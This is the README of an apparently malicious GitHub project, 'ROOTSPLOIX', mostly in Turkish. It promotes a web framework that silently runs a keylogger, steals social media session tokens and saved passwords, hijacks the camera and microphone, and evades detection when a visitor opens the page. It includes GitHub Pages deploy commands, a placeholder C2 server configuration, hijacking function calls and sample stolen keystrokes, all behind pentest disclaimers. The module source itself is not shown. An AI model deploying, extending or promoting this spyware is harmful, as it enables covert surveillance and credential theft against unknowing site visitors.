# 🔥 ROOTSPLOIX Advanced Web Exploitation Framework 💀

![Banner](https://img.shields.io/badge/ROOTSPLOIX-Advanced%20APT%20Framework-00ff00?style=for-the-badge&logo=github&logoColor=white)

> **⚠️ YASAL UYARI: Bu framework sadece yetkili penetrasyon testleri ve eğitim amaçlıdır. Yetkisiz kullanım yasaktır!**

## 🎯 Framework Özellikleri

### 🔍 Cross-Platform Exploitation
- **Windows** (Edge, Chrome, Firefox)
- **macOS** (Safari, Chrome, Firefox) 
- **iOS** (Mobile Safari)
- **Android** (Chrome Mobile, Samsung Internet)
- **Linux** (Firefox, Chromium)

### 📡 Advanced Data Collection
- **Universal Keylogger**: Tüm klavye, mouse ve touch hareketleri
- **Social Media Hijacking**: WhatsApp Web, Facebook, Instagram, Telegram sessions
- **WebRTC Exploitation**: Kamera/mikrofon hijacking, screen capture
- **Storage Extraction**: LocalStorage, IndexedDB, cookies, saved passwords
- **Real-time Monitoring**: Gerçek zamanlı aktivite izleme

### 🔧 Technical Capabilities
- **Permission Bypass**: UserMedia API'sını bypass etme teknikleri
- **Stealth Operations**: Anti-detection ve obfuscation
- **Cross-Origin Access**: Same-origin policy bypass
- **Service Worker Persistence**: Background persistent access
- **WebSocket C2**: Encrypted command & control communication

## 🚀 Quick Deploy

### GitHub Pages Deployment
```bash
# Repository oluştur
git clone https://github.com/rootsploix/rootsploix-web-exploit.git
cd rootsploix-web-exploit

# Deploy to GitHub Pages
git add .
git commit -m "🔥 ROOTSPLOIX Framework v1.0"
git push origin main

# GitHub Pages'i aktifleştir: Settings > Pages > Source: main branch
```

### Instant Access
✅ **Live Demo**: `https://rootsploix.github.io/rootsploix-web-exploit`

## 📋 Modüller

### 1. 🎯 Core Exploitation Engine (`core.exploit.js`)
- Cross-platform device detection
- C2 server communication
- Module orchestration
- Data encryption/obfuscation

### 2. ⌨️ Universal Keylogger (`modules/universal-keylogger.js`)
- Global keyboard capture
- Form data harvesting
- Mouse/touch tracking
- Clipboard monitoring

### 3. 📱 Social Media Hijacker (`modules/social-media-hijacker.js`)
- WhatsApp Web QR codes
- Facebook/Instagram tokens
- Gmail session hijacking
- Cross-platform cookie extraction

### 4. 📹 WebRTC Exploiter (`modules/webrtc-exploitation.js`)
- Camera/microphone access
- Screen sharing bypass
- Audio context hijacking
- Real-time media streaming

## ⚡ Kullanım

### Basic Usage
```javascript
// Otomatik başlatma - kullanıcı siteye girdiği anda
// Tüm modüller arka planda sessizce çalışır

// Manuel komutlar (C2 server'dan)
rootsploixCore.modules.webrtc.hijackCamera();
rootsploixCore.modules.keylogger.setTarget('password-field');
rootsploixCore.modules.socialMedia.extractWhatsAppData();
```

### Advanced Configuration
```javascript
// C2 server configuration
const config = {
    c2Server: 'wss://your-c2-server.com/ws',
    encryptionKey: 'your-32-char-encryption-key',
    stealthMode: true,
    antiDetection: true
};
```

## 🔒 Security Features

### Anti-Detection
- ✅ DevTools detection & obfuscation
- ✅ Right-click context menu blocking
- ✅ Console clearing & stealth logging
- ✅ Dynamic script loading
- ✅ Code obfuscation & minification

### Stealth Operations
- ✅ Hidden DOM elements
- ✅ Background service workers
- ✅ Encrypted data transmission
- ✅ Legitimate-looking UI/UX
- ✅ Professional branding

## 📊 Data Collection Examples

### Captured Data Types
```json
{
  "keystrokes": [
    {"key": "p", "timestamp": 1640995200000, "target": "password-field"},
    {"key": "a", "timestamp": 1640995201000, "target": "password-field"}
  ],
  "socialMedia": {
    "whatsapp": {"sessionId": "xxx", "qrCode": "data:image/png;base64,..."},
    "facebook": {"accessToken": "xxx", "userID": "123456"}
  },
  "webrtc": {
    "cameraAccess": true,
    "audioLevel": 0.85,
    "localIP": "192.168.1.100"
  }
}
```

## 🛠️ Development

### Project Structure
```
rootsploix-web-exploit/
├── index.html              # Main landing page
├── core.exploit.js         # Core framework
├── modules/
│   ├── universal-keylogger.js
│   ├── social-media-hijacker.js
│   └── webrtc-exploitation.js
├── assets/
├── README.md
└── .gitignore
```

### Building & Deployment
```bash
# Development
npm install
npm run dev

# Production build
npm run build
npm run deploy
```

## 📈 Compatibility Matrix

| Platform | Chrome | Safari | Firefox | Edge | Mobile |
|----------|--------|--------|---------|------|---------|
| Windows  | ✅ 100% | ❌ N/A | ✅ 95% | ✅ 98% | ➖ |
| macOS    | ✅ 100% | ✅ 90% | ✅ 95% | ✅ 98% | ➖ |
| iOS      | ❌ N/A | ✅ 85% | ❌ N/A | ❌ N/A | ✅ 85% |
| Android  | ✅ 95% | ❌ N/A | ✅ 90% | ❌ N/A | ✅ 95% |
| Linux    | ✅ 100% | ❌ N/A | ✅ 100% | ❌ N/A | ➖ |

## ⚠️ Yasal Bildirim

Bu framework **sadece aşağıdaki amaçlar** için kullanılmalıdır:
- ✅ Yetkili penetrasyon testleri
- ✅ Güvenlik araştırmaları
- ✅ Eğitim ve akademik çalışmalar
- ✅ Kendi sistemlerinizi test etme

**❌ YASAK KULLANIM ALANLARI:**
- Yetkisiz sisteme erişim
- Kişisel verileri çalma
- Zararlı yazılım dağıtımı
- Yasal olmayan aktiviteler

## 👨‍💻 Geliştirici

**ROOTSPLOIX** - Advanced Penetration Testing & Security Research
- 🌐 Website: [rootsploix.com](https://rootsploix.com)
- 📧 Contact: rootsploix@protonmail.com
- 🔗 GitHub: [@rootsploix](https://github.com/rootsploix)

## 📜 License

Bu proje **MIT License** altında lisanslanmıştır. Detaylar için `LICENSE` dosyasına bakınız.

---

<div align="center">

**🔥 ROOTSPLOIX - Where Security Meets Innovation 💀**

*"Hack The Planet, Secure The Future"*

</div>